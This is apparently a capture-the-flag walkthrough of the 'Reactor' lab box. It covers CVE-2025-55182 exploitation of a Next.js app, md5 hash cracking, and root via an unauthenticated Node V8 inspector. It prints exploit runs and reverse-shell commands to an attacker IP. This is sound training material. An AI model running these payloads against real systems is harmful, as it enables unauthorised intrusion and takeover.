# Reactor

## Engagement Notes

Reactor is a Linux box built around a single Next.js application on a
non-standard port: a small React Server Components app whose only other
open service is SSH. There's no deep enumeration maze here — a directory
scan surfaces one interesting endpoint, a banner names the framework, and
the foothold is a straight guess at a headline CVE that happens to be
correct. The rest of the chain is more procedural: a SQLite database leaks
password hashes, one of the two cracks, and the resulting low-privileged
account sits one process listing away from a root-owned Node.js process
that was left debuggable — and thus fully exploitable — over an
unauthenticated local socket.

## Attack path

1. **Recon** → `reactor.htb` has 22 (ssh) and 3000 (a Next.js app,
   misreported by nmap as `ppp`) open.
2. **Web content discovery** → `gobuster dir` on port 3000 surfaces a
   `render?url=` path family — a server-side URL-fetch/render endpoint — and
   `nikto` separately confirms the `x-powered-by: Next.js` banner.
3. **Foothold — CVE-2025-55182** → a public PoC for the "React2Shell"
   pre-auth RCE in React Server Components is pointed at the app cold; it
   works on the first try, landing command execution as `node`.
4. **Loot** → `sqlite3` dumps a local `reactor.db`, exposing an `admin` and
   an `engineer` user row, each with an md5 password hash.
5. **Cracking** → a rainbow-table pass cracks the `engineer` hash to
   `reac…`; the `admin` hash doesn't hit.
6. **User pivot** → SSH in as `engineer` with the cracked password →
   `user.txt`.
7. **Internal enum** → a process listing and `ss` show `root` running
   `node --inspect=127.0.0.1:9229` against a monitoring script in `/opt`.
8. **Root — V8 Inspector RCE** → the inspector's WebSocket debugger takes
   unauthenticated `Runtime.evaluate` calls; a reverse-shell payload against
   it lands a root shell → `root.txt`.

## Foothold — CVE-2025-55182, React Server Components RCE

[CVE-2025-55182](https://www.offsec.com/blog/cve-2025-55182/) ("React2Shell")
is a CVSS 10.0 pre-authentication RCE in React Server Components' Flight
protocol: a crafted deserialization payload gets React to invoke an
attacker-controlled `then` method during parsing, which reaches into
internal parsing state and ultimately executes arbitrary code — no
authentication, API key, or user interaction required. It affects React
Server Components 19.0, 19.1.0, 19.1.1, and 19.2.0, and by extension any
framework (Next.js among them) that bundles a vulnerable version.

A public PoC, [`react2shellpoc`](https://github.com/surajhacx/react2shellpoc),
was already staged in the room and pointed at the target cold:

```console
$ python payloads/react2shellpoc/exploit.py -t http://$target:3000
    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://reactor.htb:3000
  PAYLOAD   : id
────────────────────────────────────────────────────────────
[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ uid=999(node) gid=988(node) groups=988(node)
────────────────────────────────────────────────────────────
```

With code execution confirmed, the same exploit is re-run with a reverse
shell payload to catch a full session:

```
 python payloads/react2shellpoc/exploit.py -t http://reactor.htb:3000 -c 'busybox nc 10.10.14.85 9999 -e bash'
...
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.245.214 42128
id
uid=999(node) gid=988(node) groups=988(node)
```

> 🧠 There was no research step between finding the `render?url=` endpoint
> and reaching for this specific CVE — the box's name, the Next.js banner,
> and the fact that CVE-2025-55182 was a recent, high-profile React RCE
> added up to a guess, not a deduction. It happened to be right on the first
> try.

## Loot — SQLite dump and password cracking

Once on the box as `node`, a local `reactor.db` SQLite file is dumped
directly:

```console
$ sqlite3 reactor.db .dump
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
INSERT INTO users VALUES(1,'admin','a203b221…17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110…1e8e','operator','engineer@reactor.htb');
```

(A `sensor_logs` table of fictional reactor telemetry — core temp, coolant
flow — was also in the dump; it's flavor data for the box's premise and
plays no role in the chain.)

Both hashes are md5. A rainbow-table pass against them cracks the
`engineer` hash to `reac…`; the `admin` hash doesn't come back:

```
a203b221…17b8	Unknown	Not found.
39d97110…1e8e	md5	reac…
```

> 🧠 The cracking pass was a rainbow-table attempt against both hashes at
> once, without a strong expectation either would land. `engineer` did,
> `admin` didn't — the chain never ended up needing the admin account, so
> the miss wasn't chased further.

## Internal enum — a root-owned Node process with its debugger open

`/opt` holds two directories: `reactor-app` (owned by the `node`/`988`
foothold account) and `uptime-monitor`, owned by root. The latter's
`worker.js` is a small HTTP-probe script — it polls `127.0.0.1:3000` on an
interval and logs latency/status to a CSV:

```javascript
const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
// [+40 lines elided: interval-based HTTP probe, CSV logging — nothing
//  exploitable in the script itself; its significance is who runs it]
```

`ss` shows a loopback-only listener on 9229 that a process listing then ties
directly to that script, running as root with the V8 debugger flag enabled:

```console
$ ss -tulpn
tcp   LISTEN 0      511        127.0.0.1:9229      0.0.0.0:*
...

$ ps -ef | grep 9229
root        1403       1  0 04:08 ?        00:00:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

## Root — unauthenticated V8 Inspector Protocol RCE

Node's `--inspect` flag opens a [V8 Inspector](https://v8.dev/docs/inspector)
debugging endpoint — by default on `127.0.0.1:9229`, per [Node's own
debugging guide](https://nodejs.org/learn/getting-started/debugging) — that
speaks the [Chrome DevTools
Protocol](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/#method-evaluate).
Its `Runtime.evaluate` method runs arbitrary JavaScript inside the target
process on request, and the endpoint has no authentication of any kind: any
local process that can reach `127.0.0.1:9229` can drive it. Since
`worker.js` runs as root, any code evaluated through the debugger runs as
root too.

[`node-inspector-rce`](https://github.com/BHBarlow/node-inspector-rce)'s
local exploit script drives exactly this — discover the debugger session
over `/json`, connect to its WebSocket, and evaluate a payload:

```
 python node-inspector-lpe.py --payload revshell --lhost 10.10.14.85 --lport 9999

    [Local Privilege Escalation via V8 Inspector]

[*] Querying inspector at 127.0.0.1:9229 ...
[*] Target: /opt/uptime-monitor/worker.js
[*] WebSocket URL: ws://127.0.0.1:9229/99770b29-5ebf-4e2d-b361-6b8dada21272
[*] Connecting to WebSocket ...
[+] Connected!
[*] Evaluating: require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.85/9999 0>&1"').toString()
[*] Done
---
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.245.214 35670
root@reactor:/# id
uid=0(root) gid=0(root) groups=0(root)
root@reactor:/# cat ~/root.txt
c7b5c578…b085
```

> ⚠️ observed-only: the notebook goes straight to the `revshell` payload
> mode with no earlier `id`-only verification cell for this stage (unlike
> the CVE-2025-55182 foothold, which did check with `id` first). Whether
> other payload modes (`suid`, `sudoers`) were tried first isn't captured —
> any earlier attempts happened in a separate terminal and weren't pasted
> into the notebook.

## What didn't work

- **`gobuster vhost`** against port 3000 turned up nothing — no output was
  even worth capturing.
- **`nikto`** was cut short with `^C` after confirming the `x-powered-by:
  Next.js` banner — a fact the `render?url=` path from the `gobuster dir`
  scan had already implied one step earlier.

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified
against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | CVE-2025-55182 pre-auth RCE against the internet-facing Next.js app on port 3000 |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | `busybox nc ... -e bash` and the inspector's `bash -i >& /dev/tcp/...` payload, both spawning a shell |
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | `admin`/`engineer` password hashes stored in `reactor.db`, read directly off disk |
| Brute Force: Password Cracking | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Rainbow-table cracking of the `engineer` md5 hash to `reac…` |
| Valid Accounts: Local Accounts | [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | SSH login as `engineer` using the cracked password |
| Process Discovery | [T1057](https://attack.mitre.org/techniques/T1057/) | `ps -ef \| grep 9229` identifying root's `node --inspect` process |
| System Network Connections Discovery | [T1049](https://attack.mitre.org/techniques/T1049/) | `ss -tulpn` identifying the loopback-only listener on 9229 |

> **Not tagged, and why:** the V8 Inspector root escalation was considered
> for **T1068 Exploitation for Privilege Escalation**, but T1068's
> definition is specifically about "a programming error in a program,
> service, or... operating system software or kernel" — the inspector
> behaves exactly as documented; nothing is buggy about it. The real issue
> is [CWE-306, Missing Authentication for Critical
> Function](https://cwe.mitre.org/data/definitions/306.html): a
> `Runtime.evaluate` endpoint that executes arbitrary code performs no
> identity check at all. It's described in prose above and cited to CWE
> rather than force-tagged to an ATT&CK technique whose definition doesn't
> fit.

## Lessons

- **A guess off a banner and a box name is still a valid recon strategy —
  when it's checked fast and cheap.** The CVE-2025-55182 foothold wasn't
  deduced from the `render?url=` endpoint; it was a bet informed by the
  framework banner and a recent, high-profile CVE, verified in one exploit
  run. A more systematic way to check for known "headline" CVEs against a
  fingerprinted stack — rather than relying on a name-and-banner hunch —
  would tighten this gap on boxes without as convenient a giveaway.
- **A root-owned process with `--inspect` enabled is a root shell, full
  stop.** The V8 Inspector Protocol has no authentication by design; the
  only thing standing between a local shell and root was noticing the
  loopback listener on 9229 and matching it to the process list.
